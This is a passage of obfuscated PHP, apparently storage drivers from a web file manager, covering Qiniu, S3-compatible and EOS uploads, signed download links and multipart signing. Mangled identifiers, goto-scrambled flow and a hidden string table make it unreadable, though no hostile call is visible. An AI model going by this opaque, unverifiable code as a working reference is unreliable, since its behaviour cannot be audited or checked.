list($fÅ¨Ú˜Ö¯ø, $dœ„ëÛÓ) = $this->bucketManager->listFiles($this->bucket, $C‰Ğƒ„ƒà, $fùÔôƒ•Ë¶, $EŒ²Õ±çÑ…, $bÂ“¦¦”…); if ($dœ„ëÛÓ) { return !1; } $fùÔôƒ•Ë¶ = array_key_exists($a®ŸÙóìº[1186], $fÅ¨Ú˜Ö¯ø) ? $fùÔôƒ•Ë¶ = $fÅ¨Ú˜Ö¯ø[$a®ŸÙóìº[1217]] : $a®ŸÙóìº[33]; if ($cÏ…æŸ¨Ã”) { if (!empty($fÅ¨Ú˜Ö¯ø[$a®ŸÙóìº[1218]])) { $EÏ¤ïË¶»Î += count($fÅ¨Ú˜Ö¯ø[$a®ŸÙóìº[1218]]); } if (!empty($fÅ¨Ú˜Ö¯ø[$a®ŸÙóìº[1221]])) { $c…¹†ÁÓ += count($fÅ¨Ú˜Ö¯ø[$a®ŸÙóìº[1221]]); } if ($fùÔôƒ•Ë¶ === $a®ŸÙóìº[33]) { break; } continue; } if ($b›“êàƒÑÂ) { if (!empty($fÅ¨Ú˜Ö¯ø[$a®ŸÙóìº[1218]])) { return !0; } } else { if (!empty($fÅ¨Ú˜Ö¯ø[$a®ŸÙóìº[1221]])) { return !0; } } if ($fùÔôƒ•Ë¶ == $a®ŸÙóìº[33]) { break; } } goto eØå·ôªÔì; e÷Åå«†Û: $fùÔôƒ•Ë¶ = $a®ŸÙóìº[33]; $EŒ²Õ±çÑ… = 1000; $bÂ“¦¦”… = $a®ŸÙóìº[8]; goto a˜ÊëĞ†®Ğ; eØå·ôªÔì: if ($cÏ…æŸ¨Ã”) { return array($a®ŸÙóìº[201] => $EÏ¤ïË¶»Î, $a®ŸÙóìº[202] => $c…¹†ÁÓ); } return !1; goto b½ºåƒ¯è®; b½ºåƒ¯è®: } public function listAll($EÄåĞ²Ô®Õ) { $AèÃĞ×ê§Õ =& $_SERVER[¶ªÕß‚ØÁŸ]; $dÌõÑİ«â¤ = $this->fileList($EÄåĞ²Ô®Õ, 1); $B‹Ï÷é‰ÏŠ = array(); foreach ($dÌõÑİ«â¤ as $BÙôÜ–Œ¬‹) { $B‹Ï÷é‰ÏŠ[$BÙôÜ–Œ¬‹[$AèÃĞ×ê§Õ[28]]] = $BÙôÜ–Œ¬‹[$AèÃĞ×ê§Õ[87]]; } return $this->listAllFiles($EÄåĞ²Ô®Õ, array_keys($B‹Ï÷é‰ÏŠ), $B‹Ï÷é‰ÏŠ); } public function canRead($dµ±à£í) { return $this->exist($dµ±à£í) ? !0 : !1; } public function canWrite($F¦¥ùòÕª’) { return $this->exist($F¦¥ùòÕª’) ? !0 : !1; } public function getContent($FÚÙß±øÓ¹) { return $this->fileSubstr($FÚÙß±øÓ¹, 0, -1); } public function setContent($dŠòª†Ø†, $bß‹¨ÕêĞ‹ = '') { $e˜É‰‹Ü¦ = $this->tempFile($this->pathThis($dŠòª†Ø†)); file_put_contents($e˜É‰‹Ü¦, $bß‹¨ÕêĞ‹); if ($this->upload($dŠòª†Ø†, $e˜É‰‹Ü¦)) { $this->tempFileRemve($e˜É‰‹Ü¦); return !0; } return !1; } public function refreshUrls($aß›’›ÛÈ…) { goto bÇÕªÆğ Ÿ; DµÈ©Ãù¾¬: return $e¾Õò¨ì’[$f„ùõìéÌ[1222]] == $f„ùõìéÌ[709] ? !0 : !1; goto E¢Û ª„©¥; bÇÕªÆğ Ÿ: $f„ùõìéÌ =& $_SERVER[¶ªÕß‚ØÁŸ]; $DÀâµÈìŒ† = array(); if (is_array($aß›’›ÛÈ…)) { foreach ($aß›’›ÛÈ… as $AµÙ‚²•®) { $DÀâµÈìŒ†[] = $this->link($AµÙ‚²•®); } } else { $DÀâµÈìŒ†[] = $this->link($aß›’›ÛÈ…); } goto f¦¼îœĞ«Ş; f¦¼îœĞ«Ş: $F±äĞˆ‘å = new Qiniu\Cdn\CdnManager($this->auth); list($e¾Õò¨ì’, $EºÈ†ÖÈó) = $F±äĞˆ‘å->refreshUrls($DÀâµÈìŒ†); if ($EºÈ†ÖÈó) { return !1; } goto DµÈ©Ãù¾¬; E¢Û ª„©¥: } public function fileSubstr($eÌôŸß†ìµ, $DÚ‡¤˜ŸÔÛ, $BÖ›Á†ãÖö) { $b†Ì´Éã•‚ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!($d¶†ä¡‡²¿ = $this->link($eÌôŸß†ìµ))) { return !1; } $EÅÊÕˆŠ„ = !1; if ($BÖ›Á†ãÖö > 0) { $fµ©ùâ÷ë = $DÚ‡¤˜ŸÔÛ + $BÖ›Á†ãÖö - 1; $EÅÊÕˆŠ„ = array($b†Ì´Éã•‚[1223] . $DÚ‡¤˜ŸÔÛ . $b†Ì´Éã•‚[420] . $fµ©ùâ÷ë); } $a™Õ÷ª©Ûç = url_request($d¶†ä¡‡²¿, $b†Ì´Éã•‚[226], !1, $EÅÊÕˆŠ„); return $a™Õ÷ª©Ûç[$b†Ì´Éã•‚[702]] ? $a™Õ÷ª©Ûç[$b†Ì´Éã•‚[1038]] : !1; } public function upload($dèñ÷ÌâÙ, $e°¸ø÷²¶Ü, $E°¿Ú ÓÙË = false, $CŸ¥Í»×…ã = REPEAT_REPLACE) { $dù•Ü’¥äÃ = new Qiniu\Storage\UploadManager(); $BÏ×ìŒ = $this->auth->uploadToken($this->bucket, $dèñ÷ÌâÙ); $bßŒ™Ö”ô¯ = get_file_mime(get_path_ext($e°¸ø÷²¶Ü)); list($fäîËƒè­, $fÌÁ²‰Ö) = $dù•Ü’¥äÃ->putFile($BÏ×ìŒ, $dèñ÷ÌâÙ, $e°¸ø÷²¶Ü, null, $bßŒ™Ö”ô¯); return $fÌÁ²‰Ö ? !1 : $this->getPathOuter($dèñ÷ÌâÙ); } public function uploadFormData($C´èÎíÑ¦Œ, $a˜ééàÌÔ’ = 3600) { return $this->uploadToken($C´èÎíÑ¦Œ, $a˜ééàÌÔ’); } public function multiUploadFormData($bä·¬âø·Ì, $E ‚†½Ê² = 3600) { return $this->uploadToken($bä·¬âø·Ì, $E ‚†½Ê²); } private function uploadToken($d£„†Æ¥•÷, $föİÉ°—¬Õ = 3600) { goto e×Õİ½‰³; e×Õİ½‰³: $a¿«Î†ÌÖ =& $_SERVER[¶ªÕß‚ØÁŸ]; $d„—½›¿ = $föİÉ°—¬Õ; $aĞÚà™¦Æ¨ = array($a¿«Î†ÌÖ[1224] => $a¿«Î†ÌÖ[1225]); goto bÚªµ–«‡˜; bÚªµ–«‡˜: $Fµñœ§¬ò = null; $C±ÆÌ¡ó‚– = $this->auth->uploadToken($this->bucket, $Fµñœ§¬ò, $d„—½›¿, $aĞÚà™¦Æ¨, !0); $EÛ´§ÒŸ•ñ = empty($this->region) || $this->region == $a¿«Î†ÌÖ[1226] ? $a¿«Î†ÌÖ[33] : $a¿«Î†ÌÖ[420] . $this->region; goto cö¹Ï¨Ñ—‘; cö¹Ï¨Ñ—‘: $dÚí›Š‚£ = http_type() . "\72\x2f\57\x75\x70\x6c\157\x61\x64{$EÛ´§ÒŸ•ñ}\56\x71\151\156\151\165\x70\56\x63\157\155\x2f"; return array($a¿«Î†ÌÖ[1227] => $C±ÆÌ¡ó‚–, $a¿«Î†ÌÖ[1228] => $dÚí›Š‚£); goto Bô½°÷“Éå; Bô½°÷“Éå: } public function download($Aá‡ŒøÄÀ, $aºèøáˆğÍ) { goto EŞÉîŞÇ¹; EŞÉîŞÇ¹: $FĞªœ›â¦¯ = IO::getPathInner(IO::mkfile($aºèøáˆğÍ)); if (!($fğ™ªóî÷ = $this->link($Aá‡ŒøÄÀ))) { return !1; } $dƒ°¸›É = 0; goto f¥Æ¾–¥Ì‰; f¥Æ¾–¥Ì‰: $B®·•í˜¿¨ = 1024 * 200; $bÍÊŞÊíÏÅ = fopen($FĞªœ›â¦¯, $_SERVER[¶ªÕß‚ØÁŸ][1229]); while (!0) { $fÓÙŞßÎ„± = $this->fileSubstr($Aá‡ŒøÄÀ, $dƒ°¸›É, $B®·•í˜¿¨); if ($fÓÙŞßÎ„± === !1) { return !1; } fwrite($bÍÊŞÊíÏÅ, $fÓÙŞßÎ„±); $dƒ°¸›É += $B®·•í˜¿¨; if (strlen($fÓÙŞßÎ„±) < $B®·•í˜¿¨) { break; } } goto EŞèùÚìâË; EŞèùÚìâË: fclose($bÍÊŞÊíÏÅ); return $aºèøáˆğÍ; goto BÀŠŒ—öœ; BÀŠŒ—öœ: } public function link($D¡‡§Ô·¥á, $cÁÉêğ†Ÿö = '') { if (!$this->isFile($D¡‡§Ô·¥á)) { return !1; } $dôÈğ×±ø” = $this->getHost() . $_SERVER[¶ªÕß‚ØÁŸ][8] . $this->pathEncode($D¡‡§Ô·¥á) . $cÁÉêğ†Ÿö; return $this->auth->privateDownloadUrl($dôÈğ×±ø”, 3600 * 12); } public function fileOut($CˆØ¸’¬Òˆ, $DÃ†à·áÏÁ = false, $FœÆÙÕó = false, $b±”ƒƒéê— = '') { $Eœ‘Êš–‹ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!$FœÆÙÕó) { $FœÆÙÕó = $this->pathThis($CˆØ¸’¬Òˆ); } $EÈßÅìÊ = $DÃ†à·áÏÁ ? $Eœ‘Êš–‹[1230] . rawurlencode($FœÆÙÕó) : $Eœ‘Êš–‹[33]; $bŠÆº‚ç‡¸ = $this->link($CˆØ¸’¬Òˆ, $EÈßÅìÊ); $this->fileOutLink($bŠÆº‚ç‡¸); } public function fileOutServer($fÕ‹¹½«õ·, $A¶‡¼äÃöÁ = false, $FáÊªÉØ–ª = false, $BùÕªè½¬Ì = '') { parent::fileOut($fÕ‹¹½«õ·, $A¶‡¼äÃöÁ, $FáÊªÉØ–ª, $BùÕªè½¬Ì); } public function fileOutImage($e±çï¹‹ØÊ, $Cà£³‹Ü‡Â = 250) { $Cò–‰õÎŞš = $this->link($e±çï¹‹ØÊ, $_SERVER[¶ªÕß‚ØÁŸ][1231] . $Cà£³‹Ü‡Â); $this->fileOutLink($Cò–‰õÎŞš); } public function fileOutImageServer($BßĞ¡ùÚÃ, $f—è’ ¿‰ƒ = 250) { parent::fileOutImage($BßĞ¡ùÚÃ, $f—è’ ¿‰ƒ); } public function hashMd5($FŠğœ—ö÷”) { $fÁÒ‚ÏôÊ‰ =& $_SERVER[¶ªÕß‚ØÁŸ]; $CÊà¤ÕŠİ¼ = $this->objectMeta($FŠğœ—ö÷”); return isset($CÊà¤ÕŠİ¼[$fÁÒ‚ÏôÊ‰[206]]) ? $CÊà¤ÕŠİ¼[$fÁÒ‚ÏôÊ‰[206]] : !1; $F¾›òÛ¹óœ = $this->link($FŠğœ—ö÷”, $fÁÒ‚ÏôÊ‰[1232]); } public function size($B¿ƒà¯…ãæ) { $eöâ‚“ªÛÈ = $this->objectMeta($B¿ƒà¯…ãæ); return $eöâ‚“ªÛÈ ? $eöâ‚“ªÛÈ[$_SERVER[¶ªÕß‚ØÁŸ][87]] : 0; } public function info($e¤¼¨Âå) { if ($this->isFolder($e¤¼¨Âå)) { return $this->folderInfo($e¤¼¨Âå); } else { if ($this->isFile($e¤¼¨Âå)) { return $this->fileInfo($e¤¼¨Âå); } } return !1; } public function exist($D¡Ï‹„®µö) { return $this->isFile($D¡Ï‹„®µö) || $this->isFolder($D¡Ï‹„®µö); } public function isFile($aÆà»øÉ) { return !$this->isFolder($aÆà»øÉ) && $this->objectMeta($aÆà»øÉ); } public function isFolder($aˆØ¡ÜÜ„) { return $this->cacheMethod($_SERVER[¶ªÕß‚ØÁŸ][232], $aˆØ¡ÜÜ„); } protected function objectMeta($Aäèó§ƒ—„) { return $this->cacheMethod($_SERVER[¶ªÕß‚ØÁŸ][233], $Aäèó§ƒ—„); } protected function _objectMeta($Eˆš¤Ãà ) { $e–ÌÁƒÒÉ÷ =& $_SERVER[¶ªÕß‚ØÁŸ]; list($e–Óã•ƒÈ¤, $f‘÷ï†÷İ”) = $this->bucketManager->stat($this->bucket, $Eˆš¤Ãà ); if ($e–Óã•ƒÈ¤) { $e–Óã•ƒÈ¤[$e–ÌÁƒÒÉ÷[87]] = intval($e–Óã•ƒÈ¤[$e–ÌÁƒÒÉ÷[1219]]); } return $e–Óã•ƒÈ¤; } protected function _isFolder($D™°óÙ•ÇĞ) { $F†Éë•àÕ =& $_SERVER[¶ªÕß‚ØÁŸ]; list($D¹äÛñÁ, $F¡‡•ëíâñ) = $this->bucketManager->listFiles($this->bucket, trim($D™°óÙ•ÇĞ, $F†Éë•àÕ[8]) . $F†Éë•àÕ[8], $F†Éë•àÕ[33], 1, $F†Éë•àÕ[8]); return !empty($D¹äÛñÁ[$F†Éë•àÕ[1218]]) || !empty($D¹äÛñÁ[$F†Éë•àÕ[1221]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($cê›¬÷ØõÂ) { parent::__construct($cê›¬÷ØõÂ); } public function uploadFormData($D—ïİé§ö, $fÚËôº‚â = 3600) { goto D†‰‚´‘÷†; Bëí„Ñ¤¼: $Bğî‚‰‡î‚ = hash_hmac($c–Ë‡Ã¬ ‰[1147], $bîˆêº°‘, $b’½Îºöî, !0); $bÂç´ÈèÈÕ = hash_hmac($c–Ë‡Ã¬ ‰[1147], $D¶ñ¦ĞÛé¾, $Bğî‚‰‡î‚, !0); $FŞã‰°õ˜ = hash_hmac($c–Ë‡Ã¬ ‰[1147], $Cğ¸Ë¥—–, $bÂç´ÈèÈÕ); goto A£’³šÍ ë; e¨šàÇ“ø§: $D¶ñ¦ĞÛé¾ = $c–Ë‡Ã¬ ‰[1139]; $E³–ÅŠï–Ø = $fÚËôº‚â . $c–Ë‡Ã¬ ‰[33]; $fäÇ‰Ö¿ğ = $c–Ë‡Ã¬ ‰[1104]; goto Eö«èĞ‹Ø´; BßõËº¬‹ï: $Cğ¸Ë¥—– = base64_encode(json_encode($D¯«•×ª‘ƒ)); $Dœ¼Øœ´ø¢ = hash_hmac($c–Ë‡Ã¬ ‰[1147], $DŞ¯å‘—Û, $c–Ë‡Ã¬ ‰[1148] . $this->secret, !0); $b’½Îºöî = hash_hmac($c–Ë‡Ã¬ ‰[1147], $this->region, $Dœ¼Øœ´ø¢, !0); goto Bëí„Ñ¤¼; Eö«èĞ‹Ø´: $EÃ¢·Á¥¹¨ = array($this->accessKey, $DŞ¯å‘—Û, $this->region, $bîˆêº°‘, $D¶ñ¦ĞÛé¾); $eñ«Óàíã = implode($c–Ë‡Ã¬ ‰[8], $EÃ¢·Á¥¹¨); $D¯«•×ª‘ƒ = array($c–Ë‡Ã¬ ‰[1106] => gmdate($c–Ë‡Ã¬ ‰[1105], strtotime($c–Ë‡Ã¬ ‰[1140])), $c–Ë‡Ã¬ ‰[1107] => array(array($c–Ë‡Ã¬ ‰[1109] => $this->bucket), array($c–Ë‡Ã¬ ‰[1108] => $aÌÉ·ÂàÉ°), array($c–Ë‡Ã¬ ‰[1110], $c–Ë‡Ã¬ ‰[1111], $c–Ë‡Ã¬ ‰[33]), array($c–Ë‡Ã¬ ‰[1110], $c–Ë‡Ã¬ ‰[1141], $c–Ë‡Ã¬ ‰[33]), array($c–Ë‡Ã¬ ‰[1110], $c–Ë‡Ã¬ ‰[1142], $c–Ë‡Ã¬ ‰[33]), array($c–Ë‡Ã¬ ‰[1112] => $fäÇ‰Ö¿ğ), array($c–Ë‡Ã¬ ‰[1143] => $eñ«Óàíã), array($c–Ë‡Ã¬ ‰[1144] => $f”©óÑÇ‘), array($c–Ë‡Ã¬ ‰[1145] => $a´‹®³ÍŒ), array($c–Ë‡Ã¬ ‰[1146] => $E³–ÅŠï–Ø))); goto BßõËº¬‹ï; bê±³é‚æ—: $bîˆêº°‘ = $c–Ë‡Ã¬ ‰[69]; $a´‹®³ÍŒ = gmdate($c–Ë‡Ã¬ ‰[1138]); $DŞ¯å‘—Û = gmdate($c–Ë‡Ã¬ ‰[703]); goto e¨šàÇ“ø§; A£’³šÍ ë: $e…ŠãÒÕ = array($c–Ë‡Ã¬ ‰[209] => $c–Ë‡Ã¬ ‰[33], $c–Ë‡Ã¬ ‰[1149] => $c–Ë‡Ã¬ ‰[33], $c–Ë‡Ã¬ ‰[1108] => $aÌÉ·ÂàÉ°, $c–Ë‡Ã¬ ‰[1112] => $fäÇ‰Ö¿ğ, $c–Ë‡Ã¬ ‰[1116] => $Cğ¸Ë¥—–, $c–Ë‡Ã¬ ‰[1150] => $eñ«Óàíã, $c–Ë‡Ã¬ ‰[1151] => $f”©óÑÇ‘, $c–Ë‡Ã¬ ‰[1152] => $a´‹®³ÍŒ, $c–Ë‡Ã¬ ‰[1153] => $E³–ÅŠï–Ø, $c–Ë‡Ã¬ ‰[1154] => $FŞã‰°õ˜, $c–Ë‡Ã¬ ‰[179] => $this->getHost()); return $e…ŠãÒÕ; goto b™Ğç¿‚Šñ; D†‰‚´‘÷†: $c–Ë‡Ã¬ ‰ =& $_SERVER[¶ªÕß‚ØÁŸ]; $aÌÉ·ÂàÉ° = $c–Ë‡Ã¬ ‰[195]; $f”©óÑÇ‘ = $c–Ë‡Ã¬ ‰[1137]; goto bê±³é‚æ—; b™Ğç¿‚Šñ: } public function multiUploadFormData($cÀîÒ–ù‡¶, $e©†£çãï… = 3600) { $BàÙª ¶Èª =& $_SERVER[¶ªÕß‚ØÁŸ]; $Cßëã¡† ½ = gmdate($BàÙª ¶Èª[1233]); $c÷³µÛõ¸‹ = array(); $fÏ«±ˆ«‰º = $this->client->getUploadId($this->bucket, $cÀîÒ–ù‡¶, $c÷³µÛõ¸‹); if (!$fÏ«±ˆ«‰º) { return !1; } return array($BàÙª ¶Èª[219] => $fÏ«±ˆ«‰º, $BàÙª ¶Èª[179] => $this->getHost() . $BàÙª ¶Èª[8] . $this->pathEncode($cÀîÒ–ù‡¶), $BàÙª ¶Èª[220] => $Cßëã¡† ½, $BàÙª ¶Èª[99] => $cÀîÒ–ù‡¶); } public function multiUploadAuthData($Bë÷ªâ‘ä×, $e‰—‹‚¶¿Í = array()) { goto DêÖêáÓåÛ; CƒŸ‡‹Ñ‘»: if (isset($e‰—‹‚¶¿Í[$aƒáîÂöÕâ[1234]])) { $d¿ÈÁ‹¹â[$aƒáîÂöÕâ[1235]] = $e‰—‹‚¶¿Í[$aƒáîÂöÕâ[1234]]; } $a†È™—ÉÓ = explode($aƒáîÂöÕâ[181], $this->getHost()); $EİÀßÛ¤‰ = array($aƒáîÂöÕâ[1236] => $a†È™—ÉÓ[1], $aƒáîÂöÕâ[1237] => $aƒáîÂöÕâ[33], $aƒáîÂöÕâ[209] => $aƒáîÂöÕâ[126], $aƒáîÂöÕâ[1149] => $e‰—‹‚¶¿Í[$aƒáîÂöÕâ[87]]); goto FõùíÀ´²ˆ; aë¢‚£‡Ö•: unset($e‰—‹‚¶¿Í[$aƒáîÂöÕâ[99]]); if (isset($e‰—‹‚¶¿Í[$aƒáîÂöÕâ[221]])) { return $this->listUploadParts($CÑ××å¡¨ò, $e‰—‹‚¶¿Í); } $d¿ÈÁ‹¹â = array(); goto CƒŸ‡‹Ñ‘»; f±Êé‚Ë§: if (strpos($DÖì£Åà·æ, $aƒáîÂöÕâ[223]) === 0) { if (isset($d¿ÈÁ‹¹â[$aƒáîÂöÕâ[1235]])) { $E¦©òÏ“˜½ = $d¿ÈÁ‹¹â[$aƒáîÂöÕâ[1235]]; } else { if (isset($f¹‘¾éøàÎ[$aƒáîÂöÕâ[1235]])) { $E¦©òÏ“˜½ = $f¹‘¾éøàÎ[$aƒáîÂöÕâ[1235]]; } else { $E¦©òÏ“˜½ = hash($aƒáîÂöÕâ[1147], $aƒáîÂöÕâ[33]); } } return array($aƒáîÂöÕâ[229] => $f¹‘¾éøàÎ[$aƒáîÂöÕâ[229]], $aƒáîÂöÕâ[1235] => $E¦©òÏ“˜½, $aƒáîÂöÕâ[220] => $f¹‘¾éøàÎ[$aƒáîÂöÕâ[1238]]); } return $f¹‘¾éøàÎ[$aƒáîÂöÕâ[229]]; goto b¢Ç§çëÇ‰; FõùíÀ´²ˆ: $f¯‡ïğ¨³‰ = $aƒáîÂöÕâ[224]; $eğ¸Ï¿‚Ï– = $aƒáîÂöÕâ[8] . $this->pathEncode($CÑ××å¡¨ò) . $DÖì£Åà·æ; $f¹‘¾éøàÎ = $this->client->__getSignatureV4($d¿ÈÁ‹¹â, $EİÀßÛ¤‰, $f¯‡ïğ¨³‰, $eğ¸Ï¿‚Ï–); goto f±Êé‚Ë§; DêÖêáÓåÛ: $aƒáîÂöÕâ =& $_SERVER[¶ªÕß‚ØÁŸ]; $DÖì£Åà·æ = isset($e‰—‹‚¶¿Í[$aƒáîÂöÕâ[170]]) ? $e‰—‹‚¶¿Í[$aƒáîÂöÕâ[170]] : $aƒáîÂöÕâ[33]; $CÑ××å¡¨ò = $e‰—‹‚¶¿Í[$aƒáîÂöÕâ[99]]; goto aë¢‚£‡Ö•; b¢Ç§çëÇ‰: } public function listUploadParts($a–ªÔºŞ, $A”ç¤ÚÏ‰ = array()) { goto eæòâŞŞÁ“; eÕŠ—´¬‡: $BöñöŒ†æ .= $fñí‹ãÊíÅ[1242]; $DÁŠ¼ƒÀŸµ = array(); $E‚§Ü¼²âÊ = explode($fñí‹ãÊíÅ[181], $this->getHost()); goto CôÇíÉ‰çÖ; eæòâŞŞÁ“: $fñí‹ãÊíÅ =& $_SERVER[¶ªÕß‚ØÁŸ]; $aÎÙ¥¾™ğœ = str_replace($fñí‹ãÊíÅ[230], $fñí‹ãÊíÅ[33], $A”ç¤ÚÏ‰[$fñí‹ãÊíÅ[170]]); $bÆÏËÑßî = $this->client->listParts($this->bucket, $a–ªÔºŞ, $aÎÙ¥¾™ğœ); goto EÈÉºòëÛÛ; cÒÅ‰¼§ó: $e°æØí’Ô÷ = $this->client->__getSignatureV4($DÁŠ¼ƒÀŸµ, $eÑ×Ê½ Ô, $aéˆ¦÷Ê¯«, $eºÙéÕ‰, $BöñöŒ†æ); return array($fñí‹ãÊíÅ[229] => $e°æØí’Ô÷[$fñí‹ãÊíÅ[229]], $fñí‹ãÊíÅ[220] => $e°æØí’Ô÷[$fñí‹ãÊíÅ[1238]], $fñí‹ãÊíÅ[231] => $bÆÏËÑßî, $fñí‹ãÊíÅ[1235] => $e°æØí’Ô÷[$fñí‹ãÊíÅ[1235]]); goto c®“Ôõä¿Ş; EÈÉºòëÛÛ: if (!$bÆÏËÑßî) { return !1; } $BöñöŒ†æ = $fñí‹ãÊíÅ[1239]; foreach ($bÆÏËÑßî as $cÚô¨”î‚) { $BöñöŒ†æ .= $fñí‹ãÊíÅ[1240] . "\x3c\120\141\x72\x74\116\x75\x6d\142\145\162\76{$cÚô¨”î‚[$fñí‹ãÊíÅ[1191]]}\74\57\x50\x61\162\x74\116\x75\155\x62\x65\162\x3e\12" . "\74\x45\x54\x61\147\76{$cÚô¨”î‚[$fñí‹ãÊíÅ[1192]]}\x3c\57\105\x54\141\147\76\xa" . $fñí‹ãÊíÅ[1241]; } goto eÕŠ—´¬‡; CôÇíÉ‰çÖ: $eÑ×Ê½ Ô = array($fñí‹ãÊíÅ[1236] => $E‚§Ü¼²âÊ[1], $fñí‹ãÊíÅ[209] => $fñí‹ãÊíÅ[126], $fñí‹ãÊíÅ[1149] => strlen($BöñöŒ†æ)); $aéˆ¦÷Ê¯« = $fñí‹ãÊíÅ[222]; $eºÙéÕ‰ = $fñí‹ãÊíÅ[8] . $this->pathEncode($a–ªÔºŞ) . $A”ç¤ÚÏ‰[$fñí‹ãÊíÅ[170]]; goto cÒÅ‰¼§ó; c®“Ôõä¿Ş: } public function link($E³ÚĞŠô˜ƒ, $Bó¡Öòô„Œ = array()) { return parent::link($E³ÚĞŠô˜ƒ, $Bó¡Öòô„Œ); } public function fileOut($EÔßâÖ±ÙĞ, $F¢ÀÖµ«Ô = false, $EØ™Â˜‘Ã = false, $AŠïÕ©¯©ç = '') { if (strstr($this->endpoint, $_SERVER[¶ªÕß‚ØÁŸ][1243])) { return parent::fileOutServer($EÔßâÖ±ÙĞ, $F¢ÀÖµ«Ô, $EØ™Â˜‘Ã, $AŠïÕ©¯©ç); } parent::fileOut($EÔßâÖ±ÙĞ, $F¢ÀÖµ«Ô, $EØ™Â˜‘Ã, $AŠïÕ©¯©ç); } public function fileOutImage($d¼à‹Á‘££, $CÅØˆ‘œõî = 250) { if (strstr($this->endpoint, $_SERVER[¶ªÕß‚ØÁŸ][1243])) { return parent::fileOutImageServer($d¼à‹Á‘££, $CÅØˆ‘œõî); } parent::fileOutImage($d¼à‹Á‘££, $CÅØˆ‘œõî); } public function fileOutLink($AÌ…çÒê¡) { $eã®ÏÙ‡á =& $_SERVER[¶ªÕß‚ØÁŸ]; if (substr($AÌ…çÒê¡, 0, 7) == $eã®ÏÙ‡á[1119]) { $AÌ…çÒê¡ = $eã®ÏÙ‡á[1120] . substr($AÌ…çÒê¡, 7); } header($eã®ÏÙ‡á[166] . $AÌ…çÒê¡); die; } public function getHost() { $EÀøÜ°×¼£ =& $_SERVER[¶ªÕß‚ØÁŸ]; $EÙ‹–¡Ã = str_rtrim(parent::getHost(), $EÀøÜ°×¼£[8] . $this->bucket); $EÙ‹–¡Ã = explode($EÀøÜ°×¼£[181], $EÙ‹–¡Ã); return $EÙ‹–¡Ã[0] . $EÀøÜ°×¼£[181] . $this->bucket . $EÀøÜ°×¼£[101] . $EÙ‹–¡Ã[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($eß•ÓŒÖ†, $b§Ú ‰Å¬å = 0) { parent::__construct(); $this->source = $eß•ÓŒÖ†; $this->sourceSize = $b§Ú ‰Å¬å; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($eŞ«äß–ŞØ = false) { return $this->sourceSize; } public function getContent($cµ„‹¤‰ò„ = false) { if ($this->sourceType == self::TYPE_STRING) { return $this->source; } if ($this->sourceType == self::TYPE_FILE) { $EÌŒã£¢ë¶ = ftell($this->source); $AáöèÛÏ„‡ = @fread($this->source, $this->sourceSize); fseek($this->source, $EÌŒã£¢ë¶); return $AáöèÛÏ„‡; } } public function fileSubstr($eÁî¶³ •• = false, $Eñù¨µîóÒ = 0, $bùäæ¨¯Àİ = 0) { if (!$bùäæ¨¯Àİ) { $bùäæ¨¯Àİ = $this->sourceSize; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $Eñù¨µîóÒ, $bùäæ¨¯Àİ); } if ($this->sourceType == self::TYPE_FILE) { $E¶¤İ‚í’ö = ftell($this->source); fseek($this->source, $E¶¤İ‚í’ö + $Eñù¨µîóÒ); $cŸ±º×Ïˆº = @fread($this->source, $bùäæ¨¯Àİ); fseek($this->source, $E¶¤İ‚í’ö); return $cŸ±º×Ïˆº; } } public function hashMd5($FÙÆƒ¶Ìˆæ = false) { return md5($this->getContent()); } public static function hash($B‹½ãŸÅ¸á, $d»¾ßŒ’ù‡ = 0) { $BØæï¡Ş–â = new PathDriverStream($B‹½ãŸÅ¸á, $d»¾ßŒ’ù‡); return $BØæï¡Ş–â->hashSimple($B‹½ãŸÅ¸á); } public static function md5($e”Ğå»œó, $AÁÎâ‚¢† = 0) { $fÃ–¸˜ãÓ = new PathDriverStream($e”Ğå»œó, $AÁÎâ‚¢†); return $fÃ–¸˜ãÓ->hashMd5($e”Ğå»œó); } } goto a­šì¿£ª†; cšÙõ±ª”µ: class PathDriverEOS extends PathDriverBaseS3 { public function __construct($fÔ÷šî…î) { parent::__construct($fÔ÷šî…î); $this->signatureVersion($_SERVER[¶ªÕß‚ØÁŸ][210]); } public function uploadFormData($b„¾¹ã¨¼§, $F¼–©…Àš  = 3600) { goto e±º—¥š™; dº†ÖŠÇĞä: $aÚö¼°´„ˆ = $bç›„õ·Øµ[1139]; $f¼Ûéùñ = $F¼–©…Àš  . $bç›„õ·Øµ[33]; $EÕ¡…’õ½‚ = $bç›„õ·Øµ[1104]; goto E²î–“›àÇ; E²î–“›àÇ: $B…¹ÚºÜãˆ = array($this->accessKey, $eï…áŞ‚˜Ñ, $this->region, $AÀò†àÙŠÔ, $aÚö¼°´„ˆ); $dÀŠæ¶‚Î§ = implode($bç›„õ·Øµ[8], $B…¹ÚºÜãˆ); $E“”ç¦¤„ = array($bç›„õ·Øµ[1106] => gmdate($bç›„õ·Øµ[1105], strtotime($bç›„õ·Øµ[1140])), $bç›„õ·Øµ[1107] => array(array($bç›„õ·Øµ[1109] => $this->bucket), array($bç›„õ·Øµ[1108] => $DÈÃËİÂ‡), array($bç›„õ·Øµ[1110], $bç›„õ·Øµ[1111], $bç›„õ·Øµ[33]), array($bç›„õ·Øµ[1110], $bç›„õ·Øµ[1141], $bç›„õ·Øµ[33]), array($bç›„õ·Øµ[1110], $bç›„õ·Øµ[1142], $bç›„õ·Øµ[33]), array($bç›„õ·Øµ[1112] => $EÕ¡…’õ½‚), array($bç›„õ·Øµ[1143] => $dÀŠæ¶‚Î§), array($bç›„õ·Øµ[1144] => $a¦°´½µè ), array($bç›„õ·Øµ[1145] => $BŞ–¥È›²), array($bç›„õ·Øµ[1146] => $f¼Ûéùñ))); goto E¢éÌ¸¹˜ƒ; E¢éÌ¸¹˜ƒ: $DœÀµËî›¸ = base64_encode(json_encode($E“”ç¦¤„)); $bÂ˜Ì¾·š­ = hash_hmac($bç›„õ·Øµ[1147], $eï…áŞ‚˜Ñ, $bç›„õ·Øµ[1148] . $this->secret, !0); $d·Øá¼†Æ  = hash_hmac($bç›„õ·Øµ[1147], $this->region, $bÂ˜Ì¾·š­, !0); goto e…½¦çå¢ô; a•Ğ÷ÊñŠ: $bÍ–é˜©£â = array($bç›„õ·Øµ[209] => 